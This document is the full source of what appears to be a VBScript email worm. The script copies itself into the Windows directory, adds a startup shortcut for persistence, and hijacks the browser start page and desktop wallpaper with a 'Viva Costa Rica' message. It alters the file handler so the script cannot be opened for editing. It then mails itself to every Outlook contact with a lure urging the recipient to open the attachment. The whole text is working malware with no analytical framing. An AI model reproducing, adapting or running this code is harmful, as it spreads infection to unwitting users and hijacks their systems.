   Call  Rum()

   Sub Rum()

   On error resume next

   Set Wshell = WScript.CreateObject("WScript.Shell")
   Set Fso = WScript.CreateObject("Scripting.FileSystemObject")
   Set Out = WScript.CreateObject("Outlook.Application")


   Wload = Wshell.RegRead ("HKEY_CURRENT_USER\AutoSetup\StartUp")

   Wshell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.latinguia.com/buscar/avanzada.phtml?query=Costa+Rica&first=0&combination=phrase&spanish=yes&filter1_arg=Must:&filter1_form=words:&filter1=&filter2_arg=Must:&filter2_form=words:&filter2=&date_type=within&date_when=0&date_relation=older&date_month=1&date_day=1&date_year=1999&feature_ext=&area=continent&continent=all&domain=&pagetype=any&depth=&numresults=10&format=long&x=47&y=10"

   Win = Wshell.ExpandEnvironmentStrings("%windir%")

   copy = fso.CopyFile(Wscript.ScriptFullName,win&"\Microsoft.vbs",true)

   Set hidden = fso.CreateTextFile(win&"\Microsoft.txt", True)
   Set MyShortcut = Wshell.CreateShortcut(Wload & "Microsoft.lnk")

   MyShortcut.TargetPath = Wshell.ExpandEnvironmentStrings(win& "\Microsoft.vbs")
   MyShortcut.WorkingDirectory = Wshell.ExpandEnvironmentStrings("%windir%")
   MyShortcut.WindowStyle = 4
   MyShortcut.IconLocation = Wshell.ExpandEnvironmentStrings(win& "SYSTEM\shell32.dll,39")
   MyShortcut.Save

   Hidden.WriteLine(". . .    . .    . _ . .    . . . _    .    . _ .        . . .    . . _    . _ .    . . _ .    .    . _ . ")
   hidden.Write (". . .    . .    . _ . .    . . . _    .    . _ .       . . .    . . _    . _ .    . . _ .    .    . _ .  ")
   hidden.Close

   Wshell.RegWrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Edit\Command\", win&"\Notepad.exe %"&win&"\Microsoft.txt"

   Set Desk = fso.OpenTextFile(win&"\Application Data\Microsoft\Internet Explorer\desktop.htt", 1)
   Text =Desk.ReadAll
   Desk.Close
   Set Desk2 = fso.OpenTextFile(win&"\Application Data\Microsoft\Internet Explorer\desktop.htt", 2)
   Desk2.WriteLine(text)
   Desk2.WriteBlankLines(3)
   Desk2.writeline ("<DIV  style='position:absolute;LEFT: 0; TOP: 0; WIDTH: 800; HEIGHT: 600;'><br><br><br><br><br><center><TABLE bgcolor=white border=1 style='HEIGHT:247px;WIDTH:580px'width='75%'><TR bgcolor=blue><TD></TD></TR><TR bgcolor=red><TD></TD></TR><TR bgcolor=white><TD><center><font size=4>Costa Rica, es un país libre y democrático.</font></center></TD></TR><TR bgcolor=red><TD></TD></TR><TR bgcolor=blue><TD></TD></TR></TABLE><br><br><font color=red size=4><marquee>¡Viva Costa Rica!<marquee></font></center></div>")
   Desk2.Close

   Bgfull = fso.CopyFile(win&"\Application Data\Microsoft\Internet Explorer\desktop.htt",win&"\Application Data\Microsoft\Internet Explorer\Wallpapr.htt",true)

   Wshell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", win&"\Application Data\Microsoft\Internet Explorer\Wallpapr.htt"

   Wshell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", win&"\Application Data\Microsoft\Internet Explorer\Wallpapr.htt"

   if Out = "Outlook" then
   Set MapiName = Out.GetNameSpace("MAPI")

   If MapiName = "Mapi" then
   MapiName.Logon "profile", "password"


           Set newmail = Out.CreateItem(0)

       Set MyFolder = MapiName.GetDefaultFolder(10)
       if MyFolder = "Contactos" then
       Subject = "Hola."
       body = "Aquí te mando un anexo muy importante que lo abras."
       else
       Subject = "Hi"
       body = "Please open the attachment is very important."
       end if
       NumItems = MyFolder.Items.Count
       Set myItems = myFolder.Items.Restrict("[MessageClass] = 'IPM.Contact'")
       For I = 1 to NumItems
       users = MyItems(I).Email1Address
       If users = "" then
       else
       Set very = New RegExp
       very.Pattern = "@"
       very.Global = True
       very.IgnoreCase = True
       strng = users
       Set sing = very.Execute(strng)
       For Each Match in sing
       mails = 1
       Next
       if mails = 1 then
       Conts = MyItems(I).Email1Address
       newmail.Recipients.Add Conts
       end if

       end if
       Next

        newmail.Subject = Subject
            newmail.Body = Body
            newmail.Attachments.Add win & "\Microsoft.vbs"
            Conts = ""

       newmail.send
       MapiName.Logoff
       Set Out = Nothing

   End if
   End if

   Wshell.RegWrite "HKEY_CURRENT_USER\AutoSetup\Land", "Costa Rica"

   End Sub
